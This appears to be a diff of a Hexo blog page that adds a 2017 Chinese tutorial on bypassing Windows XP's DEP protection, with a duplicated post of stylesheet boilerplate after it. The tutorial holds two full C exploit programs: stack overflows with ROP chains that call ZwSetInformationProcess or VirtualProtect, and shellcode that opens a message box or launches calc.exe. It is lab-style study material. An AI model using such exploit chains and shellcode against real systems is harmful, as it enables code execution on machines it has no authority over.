@@ -181,7 +181,7 @@
             
               <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
             
-            Startseite
+            Home
           </a>
         </li>
       
@@ -191,7 +191,7 @@
             
               <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
             
-            Über
+            About
           </a>
         </li>
       
@@ -211,7 +211,7 @@
             
               <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
             
-            Kategorien
+            Categories
           </a>
         </li>
       
@@ -221,7 +221,7 @@
             
               <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
             
-            Archiv
+            Archives
           </a>
         </li>
       
@@ -288,6 +288,1694 @@
   
   
   <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/10/13/安全机制 DEP 绕过/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="John Doe">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hexo">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2017/10/13/安全机制 DEP 绕过/" itemprop="url">安全机制 DEP 绕过</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2017-10-13T21:54:34+08:00">
+                2017-10-13
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h1 id="0x01-简介"><a href="#0x01-简介" class="headerlink" title="0x01 简介"></a>0x01 简介</h1><p>DEP （Data Execution Prevention）数据保护机制，在XP SP3被引入，将地址改为不可执行，使得shellcode无法在指定位置执行。</p>
+<h1 id="0x02-绕过方法"><a href="#0x02-绕过方法" class="headerlink" title="0x02 绕过方法"></a>0x02 绕过方法</h1><p>主要还是了解现有的一些绕过方法，0day漏洞上介绍了几种方法</p>
+<ol>
+<li>Ret2libc ZwSetInformationProcess</li>
+<li>Ret2libc VirtualProtect</li>
+<li>Ret2libc VirtualAlloc</li>
+<li>利用可执行内存</li>
+<li>利用.NET</li>
+<li>利用Java applet </li>
+</ol>
+<p>大体上分为两种</p>
+<ol>
+<li>利用可执行内存</li>
+<li>直接关闭DEP</li>
+</ol>
+<p>![][1]</p>
+<h1 id="0x03-实验"><a href="#0x03-实验" class="headerlink" title="0x03 实验"></a>0x03 实验</h1><p>跟着书上的实验一步一步调吧，主要还是思想，学会思考的过程并不是为了最后的弹框，shellcode直接使用书上提供的健壮的代码</p>
+<h2 id="0x1-Ret2libc-ZwSetInformationProcess"><a href="#0x1-Ret2libc-ZwSetInformationProcess" class="headerlink" title="0x1 Ret2libc ZwSetInformationProcess"></a>0x1 Ret2libc ZwSetInformationProcess</h2><p>进程的 DEP 设置标识保存在 KPROCESS 结构中的 _KEXECUTE_OPTIONS 上，而这个标识可以通过 API函数 ZwQueryInformationProcess 和 Zw SetInformationProcess 进行查询和修改，所以可以直接将进程的 DEP 保护关闭。</p>
+<p>_KEXECUTE_OPTIONS 的结构<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">typedef struct _KEXECUTE_OPTIONS</div><div class="line">&#123;</div><div class="line">UCHAR Value; </div><div class="line">/*</div><div class="line">Pos0ExecuteDisable :1bit</div><div class="line">Pos1ExecuteEnable :1bit</div><div class="line">Pos2DisableThunkEmulation :1bit</div><div class="line">Pos3Permanent :1bit</div><div class="line">Pos4ExecuteDispatchEnable :1bit</div><div class="line">Pos5ImageDispatchEnable :1bit</div><div class="line">Pos6Spare :2bit</div><div class="line">*/</div><div class="line">&#125; KEXECUTE_OPTIONS;</div></pre></td></tr></table></figure></p>
+<p>了解了_KEXECUTE_OPTIONS的结构就可以用setinformationprocess设置相应的值，只需将第二位设置位1即可，所以关闭DEP的设置为</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">ULONG ExecuteFlags = MEM_EXECUTE_OPTION_ENABLE;</div><div class="line">ZwSetInformationProcess(</div><div class="line">NtCurrentProcess(),  // (HANDLE)-1</div><div class="line">ProcessExecuteFlags, // 0x22</div><div class="line">&amp;ExecuteFlags, 		 // ptr to 0x2</div><div class="line">sizeof(ExecuteFlags)); // 0x4</div></pre></td></tr></table></figure>
+<p>Q：这里有个问题为什么不直接传参调用函数执行<br>A：答案是这里用的strcpy是，如果直接传参那么参数中肯定会有零字节，所以想到了利用现有的函数调用</p>
+<p>T：因为微软为兼容性考虑，如果一个进程的 Permanent 位没有设置，当它加载 DLL时，系统就会对这个 DLL 进行 DEP 兼容性检查，当存在兼容性问题时进程的 DEP 就会被关闭</p>
+<p>这是利用这一个trick，绕过DEP，微软设立了一个函数LdrpCheckNXCompatibility<br>满足下面三个条件之一就会触发</p>
+<ol>
+<li>当 DLL 受 SafeDisc 版权保护系统保护时；</li>
+<li>当 DLL 包含有.aspcak、.pcle、.sforce 等字节时；</li>
+<li>Windows Vista 下面当 DLL 包含在注册表“HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\ Windows NT\CurrentVersion\Image File Execution Options\DllNXOptions”</li>
+</ol>
+<p>T：我们可以利用ollyfindaddr插件寻找关闭DEP的起始位置，同时还有一些其他的辅助地址</p>
+<p>![][2]</p>
+<p><strong>shellcode的探索过程</strong></p>
+<p>T：retn x指令可以构造rop链，当然执行过程可以归结为下面一句话，在执行当前语句时他的下一条指令是esp的指向，下下一条指令则是esp+4+x，因此rop链的执行顺序就确定了</p>
+<blockquote>
+<p>为了满足第一个条件必须将al设置为1，这里利用了一个rop链，但是接着发现在执行关闭DEP代码的时候ebp地址不可写，所以要在关闭DEP之前将可赋值地址写入ebp中，接着又发现esp不够高使得shellcode的被破坏，所以要抬高esp，下面才是执行DEP，还有一个坑在DEP的最后有一个leave操作所以，最后esp=ebp+4所以在retn的时候是返回到ebp+4的位置我们还记得给ebp赋值吗，没错就是这么巧妙，esp再次回去而且是jmp esp的位置一切都是这么巧妙。看起来是偶然的东西其实都是我们一手安排的。</p>
+</blockquote>
+<p>贴出代码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div></pre></td><td class="code"><pre><div class="line">#include&lt;stdlib.h&gt; </div><div class="line">#include&lt;string.h&gt; </div><div class="line">#include&lt;stdio.h&gt; </div><div class="line">#include&lt;windows.h&gt; </div><div class="line">char shellcode[]=  </div><div class="line">&quot;\xFC\x68\x6A\x0A\x38\x1E\x68\x63\x89\xD1\x4F\x68\x32\x74\x91\x0C&quot;  </div><div class="line">&quot;\x8B\xF4\x8D\x7E\xF4\x33\xDB\xB7\x04\x2B\xE3\x66\xBB\x33\x32\x53&quot;  </div><div class="line">&quot;\x68\x75\x73\x65\x72\x54\x33\xD2\x64\x8B\x5A\x30\x8B\x4B\x0C\x8B&quot;  </div><div class="line">&quot;\x49\x1C\x8B\x09\x8B\x69\x08\xAD\x3D\x6A\x0A\x38\x1E\x75\x05\x95&quot;  </div><div class="line">&quot;\xFF\x57\xF8\x95\x60\x8B\x45\x3C\x8B\x4C\x05\x78\x03\xCD\x8B\x59&quot;  </div><div class="line">&quot;\x20\x03\xDD\x33\xFF\x47\x8B\x34\xBB\x03\xF5\x99\x0F\xBE\x06\x3A&quot;  </div><div class="line">&quot;\xC4\x74\x08\xC1\xCA\x07\x03\xD0\x46\xEB\xF1\x3B\x54\x24\x1C\x75&quot;  </div><div class="line">&quot;\xE4\x8B\x59\x24\x03\xDD\x66\x8B\x3C\x7B\x8B\x59\x1C\x03\xDD\x03&quot;  </div><div class="line">&quot;\x2C\xBB\x95\x5F\xAB\x57\x61\x3D\x6A\x0A\x38\x1E\x75\xA9\x33\xDB&quot;  </div><div class="line">&quot;\x53\x68\x77\x65\x73\x74\x68\x66\x61\x69\x6C\x8B\xC4\x53\x50\x50&quot;  </div><div class="line">&quot;\x53\xFF\x57\xFC\x53\xFF\x57\xF8\x90\x90\x90\x90\x90\x90\x90\x90&quot;  </div><div class="line">&quot;\x90\x90\x90\x90&quot;  </div><div class="line">&quot;\x52\xE2\x92\x7C&quot;//MOV EAX,1 RETN地址  </div><div class="line">&quot;\x85\x8B\x1D\x5D&quot;//修正EBP  </div><div class="line">//&quot;\x19\x4A\x97\x7C&quot;//增大ESP  </div><div class="line">&quot;\x45\x01\x88\x7c&quot;</div><div class="line">&quot;\xB4\xC1\xC5\x7D&quot;//jmp esp  </div><div class="line">&quot;\x24\xCD\x93\x7C&quot;//关闭DEP代码的起始位置  </div><div class="line">&quot;\xE9\x33\xFF\xFF&quot;//回跳指令  </div><div class="line">&quot;\xFF\x90\x90\x90&quot;  </div><div class="line">;  </div><div class="line">void test()  </div><div class="line">&#123;  </div><div class="line">      char tt[176];  </div><div class="line">      strcpy(tt,shellcode);  </div><div class="line">&#125;  </div><div class="line">int main()  </div><div class="line">&#123;  </div><div class="line">      HINSTANCE hInst = LoadLibrary(&quot;shell32.dll&quot;);  </div><div class="line">      char temp[200];  </div><div class="line">      test();  </div><div class="line">      return 0;  </div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p>或者用</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">&quot;\x52\xE2\x92\x7C&quot;//MOV EAX,1 RETN地址 </div><div class="line">&quot;\x96\x73\x1B\x5D&quot;//修正EBP 8</div><div class="line">&quot;\x85\x8B\x1D\x5D&quot;//ebp 4</div><div class="line">&quot;\x90\x90\x90\x90&quot;</div><div class="line">&quot;\x90\x90\x90\x90&quot;</div><div class="line">//&quot;\x19\x4A\x97\x7C&quot;//增大ESP  </div><div class="line">&quot;\x45\x01\x88\x7c&quot;//esp up</div><div class="line">&quot;\xB4\xC1\xC5\x7D&quot;//jmp esp  </div><div class="line">&quot;\x24\xCD\x93\x7C&quot;//关闭DEP代码的起始位置  </div><div class="line">&quot;\xE9\x27\xFF\xFF&quot;//回跳指令  </div><div class="line">&quot;\xFF\x90\x90\x90&quot;</div></pre></td></tr></table></figure>
+<p>都是可以的只要是明白了retn的精髓那么构造shellcode就不是问题</p>
+<h2 id="0x2-VitualProtect"><a href="#0x2-VitualProtect" class="headerlink" title="0x2 VitualProtect"></a>0x2 VitualProtect</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div></pre></td><td class="code"><pre><div class="line"> </div><div class="line">// GS_Virtual.cpp : 定义控制台应用程序的入口点。  </div><div class="line">//  </div><div class="line">  </div><div class="line">#include &lt;stdlib.h&gt;  </div><div class="line">#include &lt;string.h&gt;  </div><div class="line">#include &lt;stdio.h&gt;  </div><div class="line">#include &lt;windows.h&gt;  </div><div class="line">char shellcode[]=  </div><div class="line">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;  </div><div class="line">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;  </div><div class="line">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;  </div><div class="line">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;  </div><div class="line">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;  </div><div class="line">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;  </div><div class="line">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;  </div><div class="line">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;  </div><div class="line">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;  </div><div class="line">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;  </div><div class="line">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;  </div><div class="line">&quot;\x90\x90\x90\x90&quot;  </div><div class="line">  </div><div class="line">&quot;\x94\xb0\x6c\x7d&quot;   //0x7d6cb094 pop eax  ret  </div><div class="line">//&quot;\x34\x7a\xc1\x77&quot;   //POP EBX POP ESI POP EDI  RETN at 0x77c17a34     </div><div class="line">//&quot;\x26\x62\x92\x7d&quot; //POP ECX POP ECX POP ECX  RETN at 0x7d926226  </div><div class="line">&quot;\x69\x36\x5C\x7D&quot;    // pop edi,pop ebx,pop esi,retn  </div><div class="line">&quot;\xe5\xe0\x72\x7d&quot;   //0x7d72e0e5  push esp pop ebp ret 4  </div><div class="line">&quot;\x24\x01\x6f\x7d&quot;   //ret   </div><div class="line">&quot;\x90\x90\x90\x90&quot;  </div><div class="line">&quot;\xc6\xc6\xeb\x77&quot;   //77ebc6c6  push esp jmp eax  </div><div class="line">&quot;\x10\x01\x00\x00&quot;   //要修改的内存大小  </div><div class="line">&quot;\x40\x00\x00\x00&quot;   //可读可写可执行属性代码  </div><div class="line">&quot;\xc6\xc6\xeb\x77&quot;   //77ebc6c6  push esp jmp eax  </div><div class="line">  </div><div class="line">&quot;\x90\x90\x90\x90&quot;  </div><div class="line">&quot;\x90\x90\x90\x90&quot;  </div><div class="line">&quot;\xD9\x1A\x80\x7C&quot;//修改内存属性  </div><div class="line">  </div><div class="line">&quot;\x90\x90\x90\x90&quot;  </div><div class="line">&quot;\xEB\x30\x5A\x7D&quot;//jmp esp  </div><div class="line">  </div><div class="line">&quot;\x90\x90\x90\x90&quot;  </div><div class="line">&quot;\x90\x90\x90\x90&quot;  </div><div class="line">&quot;\x90\x90\x90\x90&quot;  </div><div class="line">&quot;\x90\x90\x90\x90&quot;  </div><div class="line">  </div><div class="line">&quot;\x90\x90\x90\x90&quot;  </div><div class="line">&quot;\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b\x50\x30&quot;  </div><div class="line">&quot;\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff&quot;  </div><div class="line">&quot;\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2\xf2\x52&quot;  </div><div class="line">&quot;\x57\x8b\x52\x10\x8b\x4a\x3c\x8b\x4c\x11\x78\xe3\x48\x01\xd1&quot;  </div><div class="line">&quot;\x51\x8b\x59\x20\x01\xd3\x8b\x49\x18\xe3\x3a\x49\x8b\x34\x8b&quot;  </div><div class="line">&quot;\x01\xd6\x31\xff\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf6\x03&quot;  </div><div class="line">&quot;\x7d\xf8\x3b\x7d\x24\x75\xe4\x58\x8b\x58\x24\x01\xd3\x66\x8b&quot;  </div><div class="line">&quot;\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24&quot;  </div><div class="line">&quot;\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x5f\x5f\x5a\x8b\x12\xeb&quot;  </div><div class="line">&quot;\x8d\x5d\x6a\x01\x8d\x85\xb2\x00\x00\x00\x50\x68\x31\x8b\x6f&quot;  </div><div class="line">&quot;\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x68\xa6\x95\xbd\x9d\xff\xd5&quot;  </div><div class="line">&quot;\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb\x47\x13\x72\x6f\x6a&quot;  </div><div class="line">&quot;\x00\x53\xff\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00&quot;  </div><div class="line">;  </div><div class="line">void test()  </div><div class="line">&#123;  </div><div class="line">    char tt[176];  </div><div class="line">    printf(&quot;ttttttttttttttttttttt\n&quot;);  </div><div class="line">    memcpy(tt,shellcode,sizeof(shellcode) + 1);  </div><div class="line">&#125;  </div><div class="line">int main()  </div><div class="line">&#123;  </div><div class="line">    HINSTANCE hInst = LoadLibrary(&quot;shell32.dll&quot;);  </div><div class="line">    char temp[200];  </div><div class="line">    test();  </div><div class="line">    return 0;  </div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p>  [1]: ./安全机制 DEP 绕过/1201-e1408992591802.png<br>  [2]: ./安全机制 DEP 绕过/2017-10-06%2023-26-10%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png </p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/10/13/安全机制 DEP 绕过/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="John Doe">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hexo">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2017/10/13/安全机制 DEP 绕过/" itemprop="url">Untitled</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2017-10-13T21:54:34+08:00">
+                2017-10-13
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <!DOCTYPE html><html lang="en"><head>
+<title> 安全机制 DEP 绕过</title>
+  <meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="()">
+<link rel="stylesheet" href="http://maxcdn.bootstrapcdn.com/font-awesome/4.3.0/css/font-awesome.min.css">
+<style type="text/css">
+a:focus {
+  outline: thin dotted #333;
+  outline: 5px auto -webkit-focus-ring-color;
+  outline-offset: -2px;
+}
+
+a:hover,
+a:active {
+  outline: 0;
+}
+a {
+  color: #0088cc;
+  text-decoration: none;
+}
+
+a:hover {
+  color: #005580;
+  text-decoration: underline;
+}
+
+p {
+  margin: 0 0 1.1em;
+}
+
+small {
+  font-size: 85%;
+}
+
+strong {
+  font-weight: bold;
+}
+
+em {
+  font-style: italic;
+}
+
+cite {
+  font-style: normal;
+}
+
+
+h1.story_title {
+    margin: 0.7em 0;
+}
+.story_tags {
+    margin: 0 0 1.2em;
+}
+h1,
+h2,
+h3,
+h4,
+h5,
+h6 {
+  margin: 0.5em 0;
+    margin: 1.0em 0 .6em 0;
+  font-family: inherit;
+  font-weight: 500;
+  line-height: 20px;
+  color: inherit;
+  text-rendering: optimizelegibility;
+}
+
+h1,
+h2,
+h3 {
+  line-height: 40px;
+}
+
+h1 {
+  font-size: 38.5px;
+}
+
+h2 {
+  font-size: 31.5px;
+}
+
+h3 {
+  font-size: 24.5px;
+}
+
+h4 {
+  font-size: 17.5px;
+}
+
+h5 {
+  font-size: 14px;
+}
+
+h6 {
+  font-size: 11.9px;
+}
+
+ul,
+ol {
+  padding: 0;
+  margin: 0 0 10px 35px;
+}
+
+ul ul,
+ul ol,
+ol ol,
+ol ul {
+  margin-bottom: 0;
+}
+
+
+dl {
+  margin-bottom: 20px;
+}
+
+dt,
+dd {
+  line-height: 20px;
+}
+
+dt {
+  font-weight: bold;
+}
+
+dd {
+  margin-left: 10px;
+}
+
+hr {
+  margin: 20px 0;
+  border: 0;
+  border-top: 1px solid #eeeeee;
+  border-bottom: 1px solid #ffffff;
+}
+
+abbr[title],
+abbr[data-original-title] {
+  cursor: help;
+  border-bottom: 1px dotted #999999;
+}
+
+
+blockquote {
+  padding: 0 0 0 15px;
+  margin: 0 0 20px;
+  border-left: 5px solid #dddddd;
+}
+
+blockquote p {
+  margin-bottom: 0;
+  font-size: 16px;
+  font-weight: 300;
+  line-height: 25px;
+}
+
+blockquote small {
+  display: block;
+  line-height: 20px;
+  color: #999999;
+}
+
+blockquote small:before {
+  content: '\2014 \00A0';
+}
+q:before,
+q:after,
+blockquote:before,
+blockquote:after {
+  content: "";
+}
+
+address {
+  display: block;
+  margin-bottom: 20px;
+  font-style: normal;
+  line-height: 20px;
+}
+img {
+    height: auto;
+    max-width: 100%;
+    vertical-align: middle;
+    border: 0;
+}
+
+table {
+  max-width: 100%;
+  background-color: transparent;
+  border-collapse: collapse;
+  border-spacing: 0;
+    border: 1px solid rgba(34,36,38,.15);
+}
+.tag.label{
+display: inline-block;
+vertical-align: baseline;
+line-height: 1;
+margin: 0.125em 0.125em;
+background-color: rgba(102,128,153,0.075);
+border-color: rgba(102,128,153,0.075);
+background-image: none;
+padding: 0.6em 0.8em;
+color: rgba(0, 0, 0, 0.6);
+text-transform: none;
+font-weight: bold;
+border-radius: 0.2857rem;
+box-sizing: border-box;
+font-size: 0.7428rem;
+}
+
+.table {
+  width: 100%;
+  margin-bottom: 20px;
+}
+
+.table th,
+.table td {
+  padding: 8px;
+  line-height: 20px;
+  text-align: left;
+  vertical-align: top;
+  border-top: 1px solid #dddddd;
+}
+
+.table th {
+  font-weight: bold;
+}
+
+.table thead th {
+  vertical-align: bottom;
+}
+
+.table caption + thead tr:first-child th,
+.table caption + thead tr:first-child td,
+.table colgroup + thead tr:first-child th,
+.table colgroup + thead tr:first-child td,
+.table thead:first-child tr:first-child th,
+.table thead:first-child tr:first-child td {
+  border-top: 0;
+}
+
+.table tbody + tbody {
+  border-top: 2px solid #dddddd;
+}
+
+.table .table {
+  background-color: #ffffff;
+}
+
+
+.table-striped tbody > tr:nth-child(odd) > td,
+.table-striped tbody > tr:nth-child(odd) > th {
+  background-color: #f9f9f9;
+}
+
+tr { page-break-inside: avoid; }
+
+.story_image_container{
+   page-break-inside: avoid;
+}
+
+.xsj_underline{
+    page-break-after: always;
+    visibility: hidden;
+}
+
+.table-celled.table tr td,.table-celled.table tr th {
+    border-left: 1px solid rgba(34,36,38,.1)
+}
+
+.table-celled.table tr td:first-child,.table-celled.table tr th:first-child {
+    border-left: none
+}
+
+.toc ul {
+    list-style: none;
+}
+p {
+    line-height: 1.6;
+}
+body>p {
+  margin-bottom: 1.8em;
+}
+body>p>img.center,
+body>p>a>img.center {
+  display: block;
+  margin: 0 auto;
+  background-color: rgba(128,128,128,0.3);
+}
+body {
+    font-family: 'Helvetica Neue', Helvetica, Tahoma, Arial, 'Hiragino Sans GB', STHeiti, "Microsoft YaHei", "微软雅黑", 'WenQuanYi Micro Hei', STXihei, "华文细黑", Heiti, "黑体", SimSun, "宋体", Song, sans-serif;
+  font-size: 18px;
+  line-height: 1.33;
+  font-weight: 100;
+//  line-height: 1.8em;
+  color: #2f2f2f;
+    word-wrap: break-word;
+    word-break: break-word;
+}
+em.cjk_emphasis{
+    font-style: normal;
+    font-family: Georgia,"Times New Roman",Times,"楷体","AR PL UKai CN", "NSimSun","Songti SC","SimSun",serif!important;
+}
+body dt,
+body dd {
+  line-height: 1.35em;
+}
+body code, body .xiaoshujiang_code {
+//  background-color: #D6DBDF;
+    border: 0;
+  border-radius: 4px;
+//  color: #2C3E50;
+  font-size: 90%;
+//  padding: 2px 4px;
+}
+code {
+    background-color: rgba(214, 219, 223, 0.28);
+    border-radius: 4px;
+    color: #2C3E50;
+    padding: 2px 4px;
+}
+.xiaoshujiang_code ol{
+    margin-bottom: 0px;
+}
+body h1 {
+  line-height: 1.6;
+}
+body h2 {
+  line-height: 1.1;
+}
+body h3 {
+  line-height: 1.1;
+}
+
+.hljs, .hljs * {
+  overflow: visible !important;
+} 
+
+/**
+ * Treeview syntax highlighting based on highlight.js
+ * Copyright (c) 2014-2015, Asciidocfx Team, (MIT Licensed)
+ * https://github.com/asciidocfx/highlight-treeview.js
+ */
+.language-treeview.hljs{
+  position: relative;
+}
+.hljs-folder,
+.hljs-hiddenfile,
+.hljs-file {
+    position: relative;
+    vertical-align: top;
+    display: inline-block;
+    height: 16px;
+}
+.hljs-folder:before,
+.hljs-file:before,
+.hljs-hiddenfile:before {
+    top: 0;
+    content: '';
+    width: 14px;
+    height: 12px;
+    margin-top: 0px;
+    margin-right: 3px;
+    position: relative;
+    display: inline-block;
+    background-size: 14px;
+    background-repeat: no-repeat;
+}
+.hljs-file:before,
+.hljs-hiddenfile:before {
+    height: 14px;
+    margin-left: 1px;
+}
+.hljs-hiddenfile {
+    opacity: 0.6;
+}
+.hljs-file.photo:before {
+    font: normal normal normal 14px/1 FontAwesome;
+    content: "\f1c5";
+}
+.hljs-file.plain:before {
+    font: normal normal normal 14px/1 FontAwesome;
+    content: "\f016";
+}
+.hljs-file.source:before {
+    font: normal normal normal 14px/1 FontAwesome;
+    content: "\f1c9";
+}
+.hljs-file.archive:before {
+    font: normal normal normal 14px/1 FontAwesome;
+    content: "\f1c6";
+}
+.hljs-file.audio:before {
+    font: normal normal normal 14px/1 FontAwesome;
+    content: "\f1c7";
+}
+.hljs-file.video:before {
+    font: normal normal normal 14px/1 FontAwesome;
+    content: "\f1c8";
+}
+.hljs-file.pdf:before {
+    font: normal normal normal 14px/1 FontAwesome;
+    content: "\f1c1";
+}
+.hljs-file.xls:before {
+    font: normal normal normal 14px/1 FontAwesome;
+    content: "\f1c3";
+}
+.hljs-file.doc:before {
+    font: normal normal normal 14px/1 FontAwesome;
+    content: "\f1c2";
+}
+.hljs-file.ppt:before {
+    font: normal normal normal 14px/1 FontAwesome;
+    content: "\f1c4";
+}
+.hljs-folder:before {
+    font: normal normal normal 14px/1 FontAwesome;
+    content: "\f114";
+}
+.hljs-hiddenfile:before {
+    font: normal normal normal 14px/1 FontAwesome;
+    content: "\f016";
+}
+.hljs-tvline {
+    margin-left: 6px;
+    position: absolute;
+    text-indent: -99em;
+    padding-bottom: 8px;
+    vertical-align: top;
+    display: inline-block;
+    border-left-width: 1px;
+    border-left-style: solid;
+    border-left-color: rgb(94, 144, 117);
+}
+.hljs-folder-branch {
+    width: 8px;
+    height: 8px;
+    margin-top: -1px;
+    margin-left: 6px;
+    text-indent: -99em;
+    position: relative;
+    vertical-align: top;
+    display: inline-block;
+    border-bottom-width: 1px;
+    border-bottom-style: solid;
+    border-bottom-color: rgb(94, 144, 117);
+}
